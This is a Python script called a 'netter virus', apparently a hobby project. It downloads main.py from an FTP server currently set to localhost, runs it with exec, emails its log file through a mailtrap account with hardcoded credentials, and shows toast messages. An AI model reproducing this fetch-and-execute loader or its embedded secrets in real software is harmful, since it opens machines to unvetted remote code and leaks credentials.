import sys
from ftplib import FTP
from datetime import datetime
import time
from zipfile import ZipFile, ZIP_DEFLATED
from win10toast import ToastNotifier
from random import *
import logging
import smtplib
from email.message import EmailMessage
from email.utils import make_msgid
from configparser import ConfigParser

CONFIG_FILE_NAME: str = 'netter_virus_config.ini'
"""The name of the config file"""

# The already existing values serve as fallback if the config file cannot be read, as well as storage for default values
config_wait_time: int = 5
"""The time to wait in seconds before executing the script"""

config_logfile_name: str = 'netter_virus_logs.log'
"""The name of the log file"""

config_notification_chance: int = 20
"""The chance for each run of a notification being sent to the user in percent"""

# TODO: Expand the list with more things
USER_TELL_STRINGS: list[str] = [
    'Don\'t forget to drink Water.',
    'Never gonna give you up...',
    'The first bug was a literal bug that crawled into a computer system.'
]
"""The list of potentially useful things to tell the user"""


def init_config():
    """Initialize the config parser and prepare the config file if not ready"""

    config = ConfigParser()
    config.read(CONFIG_FILE_NAME)
    # Write the newest version of the default values into the config file
    logging.debug('Writing newest defaults into config file')
    config.remove_section('DEFAULT')
    config['DEFAULT'] = {'WaitTime': str(config_wait_time),
                         'LogfileName': str(config_logfile_name),
                         'NotificationChance': str(config_notification_chance)}
    with open(CONFIG_FILE_NAME, 'w') as config_file:
        config.write(config_file)

    return config


def read_config(config: ConfigParser):
    """Read the config file and serve the config values"""

    global config_wait_time, config_logfile_name, config_notification_chance

    # Read the current state of the config file and if there are custom values stored, use them
    logging.debug('Reading config file')
    config.read(CONFIG_FILE_NAME)
    if 'CUSTOM' in config:
        logging.debug('Custom section found, loading values')
        custom_config = config['CUSTOM']
        config_wait_time = custom_config.getint('WaitTime')
        print(config_wait_time)
        config_logfile_name = custom_config['LogFileName']
        config_notification_chance = custom_config.getint('NotificationChance')
    else:
        # If not found, add the section CUSTOM to the config file
        logging.info('Adding the custom section to the config file')
        config['CUSTOM'] = {}
        with open(CONFIG_FILE_NAME, 'w') as config_file:
            config.write(config_file)


def ftp_connect():
    """Connect to the FTP server and return the connection"""

    logging.debug('Connecting to server...')
    ftp = FTP('localhost')  # TODO: Replace address with fixed remote host address
    # Login to the FTP server as anonymous user
    ftp.login()
    return ftp


def ftp_download(ftp):
    """Download the new file from the FTP server"""

    # Create the unique name under which the new file is to be stored based on the current date and time
    filename = datetime.now().strftime("%d-%M-%Y_%H-%M-%S")
    logging.info(f'Downloading file as {filename}.py')
    # Download the file and store it
    with open(f'{filename}.py', 'wb') as fp:
        logging.debug(ftp.retrbinary(f'RETR main.py', fp.write))
    return filename


def send_email():
    """Send an email about the current status, which includes the log file"""

    logging.debug('Sending mail about status')
    # Define sender and recipient of the email
    sender = "Private Person <from@example.com>"
    receiver = "A Test User <to@example.com>"
    # Initialize the email and pass it all needed data
    message = EmailMessage()
    message.set_content('Status update. Logfile attached.')
    message['subject'] = 'Status update from netter virus'
    message['to'] = receiver
    message['from'] = sender
    message['date'] = datetime.now()
    message['message-id'] = make_msgid()
    # Add the logfile to the email as attachment
    with open(config_logfile_name) as fp:
        message.add_attachment(fp.read())
    # Send the email
    with smtplib.SMTP("smtp.mailtrap.io", 2525) as server:
        server.login("36438686bce063", "4954bd17d86bb6")  # TODO: Use a proper email service to actually send the email
        server.sendmail(sender, receiver, message.as_bytes())


def tell_user():
    """Say something potentially useful to the user taken from the USER_TELL_STRINGS list"""

    # To prevent spamming the user with notifications, there is only a 20% chance for one to be shown each run
    if randint(1, 100) <= config_notification_chance:
        logging.info('Saying something to the user:')
        # Select a random string from the list
        notification_text = USER_TELL_STRINGS[randint(0, len(USER_TELL_STRINGS) - 1)]
        logging.info(notification_text)
        # Initialize the notification
        notification = ToastNotifier()
        # Pass data to the notification and show it
        notification.show_toast('Attention please', notification_text, duration=3)


def zip_logfile(filename: str):
    """Store a copy of the log file in a ZIP file with the same name as the last downloaded python file"""

    logging.debug('Zipping logfile')
    # Create a new ZIP file and copy the current log file into it
    with ZipFile(f'{filename}.zip', mode='w', compression=ZIP_DEFLATED) as z:
        z.write(f'{config_logfile_name}')


def execute_file(filename: str):
    """Execute the previously downloaded file"""

    logging.debug(f'Opening and executing file {filename}')
    exec(open(f'{filename}.py').read())


if __name__ == '__main__':
    print('Running...')
    try:
        # Initialize logging
        logging.basicConfig(filename=config_logfile_name, level=logging.DEBUG, format='%(asctime)s %(message)s')
        logging.captureWarnings(True)
        # Start execution
        conf = init_config()
        read_config(conf)
        connection = ftp_connect()
        name = ftp_download(connection)
        connection.close()
        send_email()
        tell_user()
        # Wait before continuing the process to give the user time to close the program
        logging.debug(f'Entering wait duration of {config_wait_time} seconds...')
        time.sleep(config_wait_time)
        # Continue with the execution
        zip_logfile(name)
        execute_file(name)
    except Exception as e:
        # All exceptions are caught, this is to ensure that they get logged properly
        # If any exception occurs, the program is to log it and exit
        logging.exception('An error occurred')
        print('An error occurred, see the log file for further information.')
        sys.exit(1)
